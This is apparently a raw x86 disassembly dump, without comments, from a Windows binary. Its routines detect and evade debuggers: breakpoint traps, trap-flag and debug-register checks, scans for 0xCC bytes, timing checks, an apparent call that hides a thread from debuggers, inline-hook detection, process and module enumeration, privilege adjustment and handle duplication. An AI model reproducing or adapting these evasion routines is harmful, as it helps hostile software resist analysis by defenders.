xor eax esp
mov [ esp + 0x80 ] eax
mov eax r--data
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ r--data ]
sub eax edx
mov dx [ r--data ]
push edi
mov edi eax
mov eax [ r--data ]
mov [ esp + 0x8 ] ecx
xor ecx ecx
mov [ esp + 0x4 ] eax
mov [ esp + 0xc ] dx
test edi edi
jle r-xdata
mov [ ebx + ecx ] cl
mov ecx [ esp + 0x84 ]
pop edi
xor ecx esp
call sub_200b53e
add esp 0x84
retn
push ebp
push esi
mov esi ebx
sub esi r--data
jmp r-xdata
mov eax ecx
cdq
mov ebp 0x9
idiv ebp
mov al [ ecx + r--data ]
mov dl [ esp + edx + 0xc ]
cmp al dl
je r-xdata
mov [ esi + ecx + r--data ] al
inc ecx
cmp ecx edi
jl r-xdata
xor al dl
pop esi
pop ebp
mov [ ebx + ecx ] 0x0
pop edi
mov ecx [ esp + 0x80 ]
xor ecx esp
call sub_200b53e
add esp 0x84
retn
sub_2007cb0
sub esp 0x84
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x80 ] eax
mov eax [ r--data ]
push ebx
push esi
push edi
mov esi ecx
mov ecx [ r--data ]
mov ebx edx
mov dx [ r--data ]
xor edi edi
cmp [ esp + 0x94 ] edi
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] ecx
mov [ esp + 0x14 ] dx
jle r-xdata
mov ecx [ esp + 0x8c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_200b53e
add esp 0x84
retn
sub ebx esi
push ebp
mov [ ebx + esi ] cl
inc edi
inc esi
cmp edi [ esp + 0x98 ]
jl r-xdata
mov eax edi
cdq
mov ebp 0x9
idiv ebp
movzx eax cl
mov dl [ esp + edx + 0x10 ]
movsx ebp dl
cmp eax ebp
je r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
pop ebp
xor cl dl
sub_2007d40
push ecx
push ebp
mov ebp [ esp + 0x14 ]
push esi
mov esi eax
mov eax ebp
push edi
lea edx [ eax + 0x1 ]
nop
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
xor edi edi
cmp [ esp + 0x18 ] edi
mov [ esp + 0xc ] eax
jle r-xdata
pop edi
pop esi
pop ebp
pop ecx
retn
push ebx
mov ebx [ esp + 0x18 ]
sub ebx esi
lea esp [ esp ]
mov [ ebx + esi ] cl
inc edi
inc esi
cmp edi [ esp + 0x1c ]
jl r-xdata
mov eax edi
cdq
idiv [ esp + 0x10 ]
mov dl [ edx + ebp ]
cmp cl dl
je r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
pop ebx
xor cl dl
sub_2007da0
xor eax eax
test esi esi
jle r-xdata
xor eax eax
retn
jmp r-xdata
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor [ eax + ecx ] dl
inc eax
cmp eax esi
jl r-xdata
sub_2007e00
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_200dbe0
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
int 0x2d
nop
mov eax 0x1
jmp r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_2007e4a
mov esp [ ebp - 0x18 ]
xor eax eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_2007e70
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_200dbe0
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
int3
sub_2007eb8
mov esp [ ebp - 0x18 ]
xor eax eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_2007ee0
push ebp
push esi
push edi
xor edx edx
xor esi esi
xor ebp ebp
xor edi edi
cmp ebx 0x2
jl r-xdata
cmp edi ebx
jae r-xdata
lea ecx [ ebx - 0x2 ]
shr ecx 0x1
inc ecx
lea edi [ ecx + ecx ]
lea esp [ esp ]
pop edi
lea eax [ esi + edx ]
pop esi
add eax ebp
pop ebp
retn
mov ebp [ eax ]
add edx [ eax ]
add esi [ eax + 0x4 ]
add eax 0x8
sub ecx 0x1
jne r-xdata
sub_2007f20
push ebx
push ebp
push esi
push edi
xor edi edi
push edi
xor esi esi
call [ GetModuleHandleA@IAT ]
mov ecx [ eax + 0x3c ]
mov edx [ ecx + eax + 0x100 ]
lea ecx [ ecx + eax + 0xf8 ]
mov ecx [ ecx + 0xc ]
shr edx 0x2
xor ebp ebp
add ecx eax
xor ebx ebx
cmp edx 0x2
jl r-xdata
cmp ebx edx
jae r-xdata
lea eax [ edx - 0x2 ]
shr eax 0x1
inc eax
lea ebx [ eax + eax ]
lea ebx [ ebx ]
lea eax [ edi + esi ]
pop edi
pop esi
add eax ebp
pop ebp
pop ebx
retn
mov ebp [ ecx ]
add esi [ ecx ]
add edi [ ecx + 0x4 ]
add ecx 0x8
sub eax 0x1
jne r-xdata
sub_2007f80
xor eax eax
test ecx ecx
jbe r-xdata
xor eax eax
retn
mov dl [ eax + esi ]
xor dl 0x77
cmp dl 0xbb
je r-xdata
mov eax 0x1
retn
inc eax
cmp eax ecx
jb r-xdata
sub_2007fa0
mov eax [ eax + 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
add [ eax + 0xb8 ] 0x3
or eax 0xffffffff
retn
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov eax 0x1
retn
sub_2007fd0
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_200dbe0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov eax 0x0
mov [ eax ] 0x1
mov [ ebp - 0x24 ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_2008022
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x28 ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x1c ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x1c ]
mov eax [ ecx + 0xb8 ]
add eax 0x3
mov edx [ ebp - 0x1c ]
mov [ edx + 0xb8 ] eax
mov [ ebp - 0x20 ] 0xffffffff
mov ecx [ ebp - 0x1c ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x1c ]
cmp [ edx + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x1c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0x20 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x20 ]
retn
sub_20080a0
sub esp 0x2d0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2cc ] eax
push 0x2cc
lea eax [ esp + 0x4 ]
push 0x0
push eax
call sub_2013580
add esp 0xc
push esi
mov [ esp + 0x4 ] 0x10010
call [ SuspendThread@IAT ]
lea ecx [ esp ]
push ecx
push esi
call [ GetThreadContext@IAT ]
test eax eax
jne r-xdata
push esi
call [ ResumeThread@IAT ]
cmp [ esp + 0x4 ] 0x0
jne r-xdata
or eax 0xffffffff
mov ecx [ esp + 0x2cc ]
xor ecx esp
call sub_200b53e
add esp 0x2d0
retn
mov ecx [ esp + 0x2cc ]
xor ecx esp
mov eax 0x1
call sub_200b53e
add esp 0x2d0
retn
cmp [ esp + 0x8 ] 0x0
jne r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
cmp [ esp + 0x10 ] 0x0
jne r-xdata
xor eax eax
mov ecx [ esp + 0x2cc ]
xor ecx esp
call sub_200b53e
add esp 0x2d0
retn
sub_2008160
push esi
mov esi r--data
call sub_2008b40
push eax
push 0x0
push 0x400
call [ OpenProcess@IAT ]
pop esi
test eax eax
jne r-xdata
push eax
call [ CloseHandle@IAT ]
mov eax 0x1
retn
retn
sub_2008190
sub esp 0x230
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x22c ] eax
push ebx
push esi
mov esi ecx
call [ GetCurrentProcessId@IAT ]
mov ebx eax
call sub_2008b40
mov esi eax
test esi esi
jne r-xdata
push edi
push 0x0
push 0x2
call CreateToolhelp32Snapshot
mov edi eax
test edi edi
je r-xdata
pop esi
pop ebx
mov ecx [ esp + 0x22c ]
xor ecx esp
call sub_200b53e
add esp 0x230
retn
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ esp + 0x22c ]
xor ecx esp
call sub_200b53e
add esp 0x230
retn
lea eax [ esp + 0xc ]
push eax
push edi
mov [ esp + 0x14 ] 0x22c
call Process32FirstW
test eax eax
je r-xdata
push edi
call [ CloseHandle@IAT ]
lea esp [ esp ]
lea ecx [ esp + 0xc ]
push ecx
push edi
call Process32NextW
test eax eax
jne r-xdata
cmp esi [ esp + 0x24 ]
jne r-xdata
cmp ebx [ esp + 0x14 ]
jne r-xdata
push edi
call [ CloseHandle@IAT ]
mov ecx [ esp + 0x238 ]
pop edi
pop esi
pop ebx
xor ecx esp
mov eax 0x1
call sub_200b53e
add esp 0x230
retn
sub_2008260
push esi
push r--data
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
push 0x0
push 0x0
push 0x11
mov esi eax
call [ GetCurrentThread@IAT ]
push eax
call esi
pop esi
retn
sub_2008290
push ecx
push esi
push r--data
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
jne r-xdata
lea eax [ esp + 0x4 ]
push eax
call [ GetCurrentProcess@IAT ]
push eax
call esi
mov eax [ esp + 0x4 ]
pop esi
pop ecx
retn
pop esi
pop ecx
retn
sub_20082d0
push ecx
push esi
push r--data
push r--data
mov [ esp + 0xc ] 0x0
call [ GetModuleHandleW@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop esi
pop ecx
retn
push 0x0
push 0x4
lea eax [ esp + 0xc ]
push eax
push 0x7
call [ GetCurrentProcess@IAT ]
push eax
call esi
test eax eax
jne r-xdata
cmp [ esp + 0x4 ] eax
je r-xdata
mov eax 0x1
pop esi
pop ecx
retn
sub_2008330
push ebp
mov ebp esp
push ecx
mov eax [ ebp ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
test eax eax
jne r-xdata
mov al [ eax ]
xor al 0x77
xor ecx ecx
cmp al 0xbb
sete cl
mov eax ecx
mov esp ebp
pop ebp
retn
mov esp ebp
pop ebp
retn
sub_2008360
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x8 ] ecx
mov eax [ eax ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
test eax eax
jne r-xdata
mov al [ eax ]
xor al 0x77
xor ecx ecx
cmp al 0xbb
sete cl
mov eax ecx
mov esp ebp
pop ebp
retn
mov esp ebp
pop ebp
retn
sub_20083a0
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_200dbe0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
int1
mov [ ebp - 0x4 ] 0xfffffffe
mov eax 0x1
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_2008420
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_200dbe0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
pushf
or [ esp ] 0x100
popf
nop
mov [ ebp - 0x4 ] 0xfffffffe
mov eax 0x1
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_2008500
sub esp 0x8
push esi
call [ timeGetTime@IAT ]
mov esi eax
lea eax [ esp + 0x4 ]
push eax
call [ QueryPerformanceCounter@IAT ]
call [ GetTickCount@IAT ]
sub eax [ rw-data ]
cmp eax edi
ja r-xdata
mov eax 0x1
pop esi
add esp 0x8
retn
sub esi [ rw-data ]
cmp esi edi
ja r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
push 0x0
push 0x3e8
push ecx
push edx
call sub_2014c60
mov ecx [ esp + 0x4 ]
sub ecx [ rw-data ]
push 0x0
push eax
push 0x0
push ecx
call sub_2014c60
cmp eax edi
ja r-xdata
xor eax eax
pop esi
add esp 0x8
retn
sub_2008580
push ebx
mov ebx ecx
push eax
call sub_2009550
add esp 0x4
test eax eax
je r-xdata
xor eax eax
pop ebx
retn
push ebx
call sub_2009610
add esp 0x4
mov eax 0x1
pop ebx
retn
sub_20085b0
sub esp 0x8
push r--data
push r--data
call [ GetModuleHandleW@IAT ]
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
xor eax eax
add esp 0x8
retn
lea ecx [ esp + 0x4 ]
push ecx
push 0x2
lea edx [ esp + 0x8 ]
push edx
push 0x23
call eax
test eax eax
jne r-xdata
cmp [ esp ] al
je r-xdata
mov eax 0x1
add esp 0x8
retn
sub_2008640
sub esp 0x8
push ebx
push ebp
push esi
mov esi [ GetModuleHandleW@IAT ]
push edi
push r--data
xor ebx ebx
push r--data
xor ebp ebp
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] ebx
call esi
mov edi [ GetProcAddress@IAT ]
push eax
call edi
cmp [ eax ] 0xe9
jne r-xdata
push r--data
push r--data
call esi
push eax
call edi
cmp [ eax ] 0xe9
jne r-xdata
lea ebx [ ebp + 0x1 ]
push r--data
push r--data
call esi
push eax
call edi
cmp [ eax ] 0xe9
jne r-xdata
mov ebp 0x1
push r--data
push r--data
call esi
push eax
call edi
cmp [ eax ] 0xe9
mov eax 0x1
je r-xdata
mov [ esp + 0x10 ] 0x1
test ebx ebx
je r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x8
retn
test ebp ebp
je r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x8
retn
sub_2008700
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_200dbe0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x240
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
mov [ ebp - 0x1c ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x24c ] 0x224
call [ GetCurrentProcessId@IAT ]
push eax
push 0x8
call CreateToolhelp32Snapshot
mov edi eax
mov [ ebp - 0x250 ] edi
test edi edi
je r-xdata
xor eax eax
lea eax [ ebp - 0x24c ]
push eax
push edi
call Module32First
test eax eax
je r-xdata
push edi
call [ CloseHandle@IAT ]
mov esi 0xfffffffe
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov ebx [ ecx ]
cmp ebx [ eax ]
jne r-xdata
mov [ ebp - 0x4 ] esi
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax 0x1
jmp r-xdata
sub edx 0x4
add eax 0x4
add ecx 0x4
jmp r-xdata
lea eax [ ebp - 0x24c ]
push eax
push edi
call Module32Next
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_200b53e
mov esp ebp
pop ebp
retn
cmp edx 0x4
jb r-xdata
mov [ ebp - 0x4 ] 0x0
mov ecx [ r--data ]
mov [ ebp - 0x28 ] ecx
mov edx [ r--data ]
mov [ ebp - 0x24 ] edx
mov ax [ r--data ]
mov [ ebp - 0x20 ] ax
mov ecx [ ebp - 0x238 ]
add ecx 0x1b229
mov edx 0x9
lea eax [ ebp - 0x28 ]
sub_20087e3
mov esp [ ebp - 0x18 ]
mov esi 0xfffffffe
mov [ ebp - 0x4 ] esi
mov edi [ ebp - 0x250 ]
mov [ ebp - 0x4 ] 0x0
mov ecx [ r--data ]
mov [ ebp - 0x28 ] ecx
mov edx [ r--data ]
mov [ ebp - 0x24 ] edx
mov ax [ r--data ]
mov [ ebp - 0x20 ] ax
mov ecx [ ebp - 0x238 ]
add ecx 0x1b229
mov edx 0x9
lea eax [ ebp - 0x28 ]
push edi
call [ CloseHandle@IAT ]
xor eax eax
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov ebx [ ecx ]
cmp ebx [ eax ]
jne r-xdata
mov [ ebp - 0x4 ] esi
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax 0x1
jmp r-xdata
sub edx 0x4
add eax 0x4
add ecx 0x4
jmp r-xdata
lea eax [ ebp - 0x24c ]
push eax
push edi
call Module32Next
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_200b53e
mov esp ebp
pop ebp
retn
cmp edx 0x4
jb r-xdata
sub_2008830
sub esp 0x230
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x22c ] eax
push edi
call [ GetCurrentProcessId@IAT ]
mov edi eax
call sub_2008ec0
mov edi eax
test edi edi
jne r-xdata
push esi
push 0x0
push 0x2
call CreateToolhelp32Snapshot
mov esi eax
test esi esi
je r-xdata
pop edi
mov ecx [ esp + 0x22c ]
xor ecx esp
call sub_200b53e
add esp 0x230
retn
mov ecx [ esp + 0x234 ]
pop esi
pop edi
xor ecx esp
xor eax eax
call sub_200b53e
add esp 0x230
retn
lea eax [ esp + 0x8 ]
push eax
push esi
mov [ esp + 0x10 ] 0x22c
call Process32FirstW
test eax eax
je r-xdata
push esi
call [ CloseHandle@IAT ]
pop esi
mov eax 0x1
pop edi
mov ecx [ esp + 0x22c ]
xor ecx esp
call sub_200b53e
add esp 0x230
retn
cmp edi [ esp + 0x10 ]
je r-xdata
push esi
call [ CloseHandle@IAT ]
lea ecx [ esp + 0x8 ]
push ecx
push esi
call Process32NextW
test eax eax
jne r-xdata
sub_2008910
push esi
mov esi edx
push edi
xor eax eax
mov edi 0x104
sub esi ecx
lea ecx [ ecx ]
test edi edi
jne r-xdata
mov dl [ esi + ecx ]
test dl dl
je r-xdata
pop edi
mov [ ecx ] al
pop esi
retn
dec ecx
pop edi
mov eax 0x8007007a
mov [ ecx ] 0x0
pop esi
retn
mov [ ecx ] dl
inc ecx
sub edi 0x1
jne r-xdata
lea edx [ edi + 0x7ffffefa ]
test edx edx
je r-xdata
dec ecx
pop edi
mov eax 0x8007007a
mov [ ecx ] 0x0
pop esi
retn
sub_2008960
push ecx
push ebx
mov ebx eax
push edi
lea edi [ esp + 0x8 ]
mov ecx 0x104
mov edx ebx
call sub_2008a40
test eax eax
jl r-xdata
pop edi
pop ebx
pop ecx
retn 0x4
push esi
mov esi [ esp + 0xc ]
mov ecx 0x104
sub ecx esi
lea edx [ esi + ebx ]
mov eax 0x0
je r-xdata
dec edx
mov eax 0x8007007a
mov edi [ esp + 0x14 ]
lea esi [ ecx + esi + 0x7ffffefb ]
sub edi edx
lea esp [ esp ]
test ecx ecx
jne r-xdata
mov bl [ edi + edx ]
test bl bl
je r-xdata
mov [ edx ] 0x0
pop esi
mov [ edx ] bl
dec ecx
inc edx
dec esi
test ecx ecx
jne r-xdata
test esi esi
je r-xdata
pop esi
dec edx
pop edi
mov eax 0x8007007a
mov [ edx ] cl
pop ebx
pop ecx
retn 0x4
sub_20089e0
xor eax eax
test ecx ecx
je r-xdata
mov eax 0x80070057
cmp ecx 0x7fffffff
jbe r-xdata
retn
push ebx
push esi
lea esi [ ecx - 0x1 ]
mov ecx [ esp + 0xc ]
lea eax [ esp + 0x10 ]
push eax
push ecx
push esi
push edi
xor ebx ebx
call sub_200c65e
add esp 0x10
test eax eax
jl r-xdata
test eax eax
jl r-xdata
mov [ esi + edi ] bl
mov ebx 0x8007007a
cmp eax esi
ja r-xdata
jne r-xdata
pop esi
mov eax ebx
pop ebx
mov [ esi + edi ] bl
pop esi
mov eax ebx
pop ebx
retn
sub_2008a40
xor eax eax
push esi
mov esi ecx
test ecx ecx
je r-xdata
mov eax 0x80070057
lea esp [ esp ]
pop esi
retn
test eax eax
jl r-xdata
test ecx ecx
jne r-xdata
inc edx
sub ecx 0x1
jne r-xdata
mov [ edi ] 0x0
sub esi ecx
mov [ edi ] esi
pop esi
retn
test edi edi
je r-xdata
cmp [ edx ] al
je r-xdata
jmp r-xdata
sub_2008a80
push edi
mov edi eax
xor eax eax
test ecx ecx
je r-xdata
mov eax 0x80070057
cmp ecx 0x7fffffff
jbe r-xdata
pop edi
retn
test eax eax
jl r-xdata
test edi edi
je r-xdata
mov [ edi ] 0x0
call sub_2008a40
pop edi
retn
sub_2008ab0
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov edi eax
xor eax eax
test edx edx
je r-xdata
pop edi
dec ecx
pop esi
mov eax 0x8007007a
mov [ ecx ] 0x0
pop ebx
retn 0x4
nop
test edx edx
jne r-xdata
mov bl [ esi ]
test bl bl
je r-xdata
pop edi
pop esi
mov [ ecx ] al
pop ebx
retn 0x4
mov [ ecx ] bl
dec edx
inc ecx
inc esi
dec edi
test edx edx
jne r-xdata
test edi edi
je r-xdata
pop edi
dec ecx
pop esi
mov eax 0x8007007a
mov [ ecx ] dl
pop ebx
retn 0x4
sub_2008b00
push ebx
push esi
push eax
mov esi edx
push ecx
dec esi
push esi
push edi
xor ebx ebx
call sub_200c65e
add esp 0x10
test eax eax
jl r-xdata
mov eax 0x8007007a
mov [ esi + edi ] bl
cmp eax esi
ja r-xdata
mov eax ebx
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + edi ] bl
pop esi
pop ebx
retn
sub_2008b40
sub esp 0x12c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x128 ] eax
push ebx
push edi
xor ebx ebx
push ebx
push 0x2
call CreateToolhelp32Snapshot
mov edi eax
test edi edi
je r-xdata
pop edi
xor eax eax
pop ebx
mov ecx [ esp + 0x128 ]
xor ecx esp
call sub_200b53e
add esp 0x12c
retn
lea eax [ esp + 0x8 ]
push eax
push edi
mov [ esp + 0x10 ] 0x128
call Process32First
test eax eax
jne r-xdata
mov eax esi
lea edx [ eax + 0x1 ]
push edi
call [ CloseHandle@IAT ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x30 ]
push esi
push ecx
call sub_200c843
add esp 0xc
test eax eax
je r-xdata
mov ebx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
push edx
push edi
call Process32Next
test eax eax
jne r-xdata
jmp r-xdata
push edi
call [ CloseHandle@IAT ]
mov ecx [ esp + 0x130 ]
pop edi
mov eax ebx
pop ebx
xor ecx esp
call sub_200b53e
add esp 0x12c
retn
sub_2008c00
sub esp 0x10
xor eax eax
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] eax
mov [ esp ] 0x1
cmp [ esp + 0x14 ] eax
je r-xdata
and eax 0xfffffffd
or eax 0x2
jmp r-xdata
push esi
mov [ esp + 0x10 ] eax
lea eax [ esp + 0x8 ]
push eax
push r--data
push 0x0
call [ LookupPrivilegeValueA@IAT ]
lea ecx [ esp + 0x18 ]
push ecx
push 0x20
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
mov eax [ esp + 0x18 ]
push 0x0
push 0x0
push 0x10
lea edx [ esp + 0x10 ]
push edx
push 0x0
push eax
call [ AdjustTokenPrivileges@IAT ]
call [ GetLastError@IAT ]
mov ecx [ esp + 0x18 ]
mov esi eax
neg esi
sbb esi esi
push ecx
inc esi
call [ CloseHandle@IAT ]
mov eax esi
pop esi
add esp 0x10
retn
sub_2008c90
sub esp 0x54
push ebx
push ebp
push esi
mov esi [ GetModuleHandleA@IAT ]
push edi
push r--data
push r--data
call esi
mov edi [ GetProcAddress@IAT ]
push eax
call edi
push r--data
mov ebp eax
push r--data
mov [ esp + 0x24 ] ebp
call esi
push eax
call edi
mov ebx eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x54
retn
test ebp ebp
je r-xdata
mov eax [ esp + 0x68 ]
push eax
push 0x0
push 0x40
call [ OpenProcess@IAT ]
mov [ esp + 0x18 ] eax
call [ GetCurrentProcess@IAT ]
push 0x4
push 0x1000
push 0x1000
push 0x0
mov [ esp + 0x38 ] eax
call [ VirtualAlloc@IAT ]
lea ecx [ esp + 0x14 ]
push ecx
push 0x1000
mov edi eax
push edi
push 0x10
call ebx
mov ebp [ VirtualFree@IAT ]
cmp eax 0xc0000004
jne r-xdata
cmp [ edi ] 0x0
lea eax [ edi + 0x4 ]
mov [ esp + 0x20 ] 0x0
jbe r-xdata
push 0x8000
push 0x0
push edi
call ebp
mov esi [ esp + 0x14 ]
push 0x4
push 0x1000
add esi 0x1000
push esi
push 0x0
call [ VirtualAlloc@IAT ]
lea edx [ esp + 0x14 ]
push edx
push esi
mov edi eax
push edi
push 0x10
call ebx
cmp eax 0xc0000004
je r-xdata
push 0x8000
push 0x0
push edi
call ebp
mov ecx [ esp + 0x18 ]
push ecx
call [ CloseHandle@IAT ]
mov [ esp + 0x24 ] eax
jmp r-xdata
mov ecx [ esp + 0x68 ]
cmp [ eax ] ecx
jne r-xdata
mov ecx [ esp + 0x20 ]
mov eax [ esp + 0x24 ]
inc ecx
add eax 0x10
mov [ esp + 0x20 ] ecx
mov [ esp + 0x24 ] eax
cmp ecx [ edi ]
jb r-xdata
mov ecx [ esp + 0x28 ]
push 0x2
push 0x0
push 0x0
lea edx [ esp + 0x1c ]
push edx
movzx edx [ eax + 0x6 ]
mov eax [ esp + 0x28 ]
push ecx
push edx
push eax
call [ DuplicateHandle@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x14 ]
push ecx
push 0x38
lea edx [ esp + 0x34 ]
push edx
push 0x0
push eax
call [ esp + 0x30 ]
mov eax [ esp + 0x50 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
push ecx
push 0x4
push 0x1000
push eax
push 0x0
mov ebx eax
call [ VirtualAlloc@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov ecx [ esp + 0x10 ]
lea eax [ esp + 0x14 ]
push eax
push ebx
push esi
push 0x1
push ecx
call [ esp + 0x30 ]
test eax eax
jge r-xdata
mov edx [ esp + 0x10 ]
push edx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov edx [ esp + 0x10 ]
push edx
call [ CloseHandle@IAT ]
mov ecx [ esp + 0x70 ]
mov edx [ esp + 0x68 ]
mov eax [ esi + 0x4 ]
push ecx
push edx
push eax
call [ esp + 0x78 ]
push 0x8000
push 0x0
push esi
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
push eax
jmp r-xdata
call ebp
push 0x8000
push 0x0
push edi
call ebp
mov edx [ esp + 0x10 ]
mov esi [ CloseHandle@IAT ]
push edx
call esi
mov eax [ esp + 0x18 ]
push eax
call esi
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x54
retn
call ebp
call [ CloseHandle@IAT ]
push 0x8000
push 0x0
push esi
call ebp
jmp r-xdata
sub_2008ec0
sub esp 0x230
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x22c ] eax
push esi
push 0x0
push 0x2
call CreateToolhelp32Snapshot
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop esi
mov ecx [ esp + 0x22c ]
xor ecx esp
call sub_200b53e
add esp 0x230
retn
